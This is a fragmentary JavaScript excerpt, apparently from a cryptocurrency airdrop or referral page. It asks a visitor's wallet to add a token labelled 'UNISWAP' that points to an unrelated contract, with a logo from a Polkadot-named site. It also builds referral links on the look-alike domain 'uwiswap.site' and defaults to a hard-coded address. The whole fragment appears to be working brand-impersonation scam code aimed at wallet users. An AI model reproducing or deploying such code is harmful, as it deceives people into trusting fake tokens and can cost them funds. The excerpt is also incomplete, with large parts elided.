...
const sttaddr = "0xE4e143E31D20BCb8afA585c8d5883096053Da9cA",
    sttabi = [{
        "inputs": [],
    ...
    try {
        web3.currentProvider.sendAsync({
            ...
            params: {
                type: "ERC20",
                options: {
                    address: "0xE4e143E31D20BCb8afA585c8d5883096053Da9cA",
                    symbol: "UNISWAP",
                    decimals: "18",
                    image: "https://www.Polkadottoken.website/images/logo.png"
                }
            },
...
function getreflink() {
    ...
    document.getElementById("refaddress").value ? /^(0x){1}[0-9a-fA-F]{40}$/i.test(e) ? document.getElementById("refaddress").value = "https://www.uwiswap.site/?ref=" + document.getElementById("refaddress").value : Swal.fire("Referral Alert", "Your address is not valid.", "error") : Swal.fire("Referral Alert", "Please Enter Your BEP20 Address.", "error")
}
...
var ref = querySt("ref");
null == ref ? (ref = "0xE4e143E31D20BCb8afA585c8d5883096053Da9cA", document.getElementById("airinput").value = ref) : document.getElementById("airinput").value = ref;